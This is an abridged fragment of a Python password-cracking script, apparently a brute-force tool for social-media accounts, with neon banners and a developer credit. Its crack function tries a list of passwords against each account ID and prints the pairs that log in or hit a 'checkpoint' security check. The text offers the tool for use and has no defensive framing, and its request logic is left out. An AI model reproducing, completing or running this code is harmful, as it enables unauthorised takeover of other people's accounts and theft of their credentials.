...
\x1b[38;5;46m______________________________________________________
 ...
 \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m DEVELOPER2: 🔥VEAR,VIP3🔥 
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo} [VEAR3,VIP] {h}{loop}|{len(id)} | {h}{ok} ")
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r \x1b[1;91m[VEAR,VIP3-CP] {idf} | {pw}')     
				...
				#print ()
				print(f'\r\r\x1b[38;5;46m[VEAR,VIP3-OK💉] '+idf+ ' | '+pw+'')
